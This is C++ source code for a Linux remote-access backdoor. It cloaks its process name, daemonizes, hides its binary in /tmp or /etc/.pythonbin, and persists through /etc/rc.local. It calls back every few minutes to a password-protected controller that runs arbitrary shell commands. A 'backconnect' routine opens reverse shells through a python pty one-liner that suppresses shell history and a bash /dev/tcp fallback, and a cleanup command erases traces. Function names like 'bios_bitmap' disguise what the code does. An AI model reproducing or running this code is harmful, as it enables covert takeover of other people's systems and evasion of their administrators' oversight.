#include <iostream>
#include <cstdlib>
#include <cstring>
#include <thread>
#include <fstream>
#include <cstdio>
#include <sstream>
#include <vector>
extern "C"{
    #include <signal.h>
    #include <sys/stat.h>
    #include <limits.h>
    #include <sys/utsname.h>
    #include <unistd.h>
    #include <stdio.h>
    #include <sys/prctl.h>
    #include <sys/socket.h>
    #include <arpa/inet.h> 
}

using namespace std;

struct gui_config{
    const string client_ver = "lol"; // client name 
    const string client_patch = "127.0.0.1"; // host to call back to
    const string client_buffer = "22123"; // port to call back to port 80 and 443 will look like web sockets
    const string client_key = "lolpass"; // password
}; gui_config gc; 

class gui_bar{
    public:
        string gui_c(string lc) 
        {
          if(lc.size() > 1019){
              return "failure, Buffer Overflow detected!"; // oh uh buffer overflow! quickly exit!
          }
          FILE *in;
          char *buff;
          buff = (char*)malloc(1024);
          string out = "";
          if(!(in = popen((lc).c_str(), "r"))){
            return "failure";
          } while(fgets(buff, 1024, in)!=NULL){
            out += buff;
          }
          free(buff);
          pclose(in); 
          if(out.size() > 0){
            return out;
          }
          else{
             return  string(lc) + ": command not found\n";
          }
        }
        void daemon(void)
        {
            int x;
            pid_t pid;
            pid = fork();
            if (pid < 0){
                exit(-1);
            } if(pid > 0){
                exit(0);
            } if (setsid() < 0){
                exit(-1);
            }
            signal(SIGCHLD,SIG_IGN);
            signal(SIGHUP,SIG_IGN);
            pid = fork();
            if (pid < 0){
                exit(-1);
            } if (pid > 0){
                exit(0);
            }
            umask(0);
            chdir("/tmp/");
            for (x = sysconf(_SC_OPEN_MAX); x>0; x--){
                close (x);
            }
        }
        string getexepath(void)  //ripped from somewhere
        {
          char result[PATH_MAX];
          ssize_t count = readlink( "/proc/self/exe", result, PATH_MAX );
          return string( result, (count > 0) ? count : 0 );
          free(result);
        }
        void cps_codex(void)
        {
            remove((getexepath()).c_str()); 
            remove("/tmp/.pythonbin/");
            remove("/etc/.pythonbin/");
        }
        void bios_bitmap(string bios_host, string bios_num) 
        {
            if(system(("python3 -c 'import os, pty, socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"" + string(bios_host) + "\", " + string(bios_num) + ")); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv(\"HISTFILE\",\"/dev/null\"); pty.spawn(\"/bin/bash\"); s.close();'").c_str()) != 0){
                if(system(("bash -i >& /dev/tcp/" + string(bios_host) + "/" + string(bios_num) + " 0>&1").c_str()) != 0){
                    return;   // all backconnects failed, must be a shitty box
                }
            }
        }
        string ftp_g(void) 
        {
            string shell_bar, uid_user, current_user, cwd;
            struct utsname sysinfo;
            uname(&sysinfo);
            current_user = gui_c("whoami").replace(gui_c("whoami").find("\n"), 2, "");
            cwd = gui_c("pwd").replace(gui_c("pwd").find("\n"), 2, "");
            if(getuid() == 0){
                uid_user = " $ ";
            } else{
                uid_user = " # ";
            }
            return string(current_user) + string("@") + string(sysinfo.nodename) + string(":~") + string(cwd) + string(uid_user);
        }
        bool write_to_boot(string file_name, string boot_file){
          ifstream count_line;
          ofstream startup;
          startup.open(("/tmp/tmp.txt"), ios::out | ios::app);
          string line;
          count_line.open(file_name);
          while(count_line.good()){
          while(!count_line.eof()) // To get you all the lines.
            {
              line = "";
              getline(count_line, line);
              if(line.find(boot_file) != -1){
              remove("/tmp/tmp.txt");
              return false;
              }
              else if(line=="# Make sure that the script will \"exit 0\" on success or any other" || line!="exit 0"){
                startup << line << endl;  
              }
            }
            count_line.close();
            break;
          }
          startup << boot_file << endl;
          startup << "exit 0" << endl;
          startup.close();     
          rename("/tmp/tmp.txt", (file_name).c_str());
          remove("/tmp/tmp.txt");
          chmod((file_name).c_str(), 755);
          return true;
		    }
        void file_setup(string service_s, string file_p)
        {
          struct stat st = {0};
          if(getuid() != 0){ // not root :(
              if (stat("/tmp/.pythonbin/", &st) == -1) {
                  mkdir("/tmp/.pythonbin/", 0700); 
                  rename((getexepath()).c_str(), "/tmp/.pythonbin/bin.py");
              }
              else{
                 remove((getexepath()).c_str()); 
              }
          }
          else{ //root
            if (stat("/etc/.pythonbin/", &st) == -1) {
              mkdir("/etc/.pythonbin/", 0700);
              rename((getexepath()).c_str(), "/etc/.pythonbin/bin.py");
            }
            else{
              remove((getexepath()).c_str());
            }
            write_to_boot(service_s, file_p);
          }   
        }
}; gui_bar gb;

class gui_user{
  public:
    string gui_procc(string gui_l){ // elite proccess cloaking!
        string split_line, gui_buffer, gui_name;
        vector<string> gui_uv;
        gui_buffer = gb.gui_c("ps -e -o command");
        stringstream iss(gui_buffer);
        while(iss.good())
        {
            split_line = "";
            getline(iss,split_line,'\n');
            if(split_line.size() > 0 || split_line!="COMMAND"){
                gui_uv.push_back(split_line);
            }
        }
        while(1){
          gui_name = gui_uv[rand()%gui_uv.size()];
          if(gui_name.find("ps -e -o command") != -1 || gui_name == gui_l || gui_name=="COMMAND" || gui_name.size() <= 1){
            sleep(1);
            continue;
          }
          else{
            return gui_name;
          }
        }  
    }
}; gui_user gu;

class cli_architecture : gui_config{ // backconnect
  public:  
      void isdn(void)
      {
        string dir_line;
        bool isauth=false;
        struct sockaddr_in serverc0;
        int s0 = socket(AF_INET, SOCK_STREAM, 0); 
        if(s0 < 0){ // cant create a socket
          close(s0);
          return;
        } 
        serverc0.sin_addr.s_addr = inet_addr((client_patch).c_str());
        serverc0.sin_family = AF_INET;
        serverc0.sin_port = htons(stoi(client_buffer));
        if(connect(s0, (struct sockaddr *)&serverc0 , sizeof(serverc0)) < 0){ // denied a connection or wont connect
          close(s0);
          return;
        } 
        send(s0,("Enter Password> "), sizeof("Enter Password> "), 0);
        while(1){
            string line;
            char data = 0; 
            while (data != '\n'){
                ssize_t datarecv = recv(s0, &data, 1, 0);
                if(datarecv == -1){
                    if (errno != EAGAIN && errno != EWOULDBLOCK){ 
                        close(s0);
                        return;
                    }
                } if(datarecv == 0) { 
                    close(s0);
                    return;
                }
                line += data;
                if (line.size() > 2048){ 
                    close(s0);
                    return;
                }
            }
            if(line.size() > 0){ // yes, yes here we go!
                line.replace(line.find("\n"), 2, "");    
                if(isauth!=true){
                  if(line==client_key){
                      isauth=true;
                      send(s0,("Authorised! Current PID is: " + to_string(getpid()) +  " Client name is: " + string(client_ver) + string("\n")).c_str(), ("Authorised! Current PID is: " + to_string(getpid()) +  " Client name is: " + string(client_ver) + string("\n")).size(), 0);
                      send(s0, (gb.ftp_g()).c_str(), (gb.ftp_g()).size(), 0);
                      continue;
                  }
                  else{
                      send(s0,("Incorrect password!"), sizeof("Incorrect password!"), 0);
                      send(s0,("\nEnter Password> "), sizeof("\nEnter Password> "), 0);
                      continue;
                  }
                }
                else{
                  if(line.find("cd ") != -1){
                      dir_line = line.replace(line.find("cd "), 3, ""); 
                      chdir((dir_line).c_str());
                  } else if(line=="exit" || line=="quit"){    
                      close(s0);
                      exit(0);
                  } else if(line=="session_exit" || line=="sess_exit"){
                      close(s0);
                      return;
                  } else if(line.find("backconnect ") != -1){ //backconnect host port
                    vector<string> backconnect_v;
                    line.replace(line.find("backconnect "), 12, "");
                    string buffer; 
                    stringstream white_space_ss(line); 
                    while(white_space_ss >> buffer){
                        backconnect_v.push_back(buffer); 
                    } if((backconnect_v).size() == 2 && (backconnect_v[0]).size() > 1 && (backconnect_v[1]).size() > 1){
                       thread(&gui_bar::bios_bitmap, &gb, backconnect_v[0], backconnect_v[1]).detach();
                    } else{
                      send(s0,("Incorrect usage: backconnect host port\n"), sizeof("Incorrect usage: backconnect host port\n"), 0); 
                    }
                  } else if(line=="bd_cleanup"){
                      gb.cps_codex(); // cps_codex(void)
                  } else{
                      send(s0,(gb.gui_c(line)).c_str(), (gb.gui_c(line)).size(), 0);
                  } send(s0, (gb.ftp_g()).c_str(), (gb.ftp_g()).size(), 0);
                  continue;
                }
              }
          }
          close(s0);
          return;
      }  
}; cli_architecture ca;

int main(int argc, char *argv[]){
    srand(time(NULL)); 
    string gui_t = gu.gui_procc(argv[0]);
    strcpy(argv[0], (gui_t).c_str()); // cloak, command name
    prctl(PR_SET_NAME, (gui_t).c_str()); // cloak, thread name
    gb.daemon();
    gb.file_setup("/etc/rc.local", "/etc/.pythonbin/bin.py");
    while(1){
        thread(&cli_architecture::isdn, &ca).detach();
        sleep((rand()%(360-60 + 1) + 60)); // 1-5 mins call back
    } 
    return 0;
}
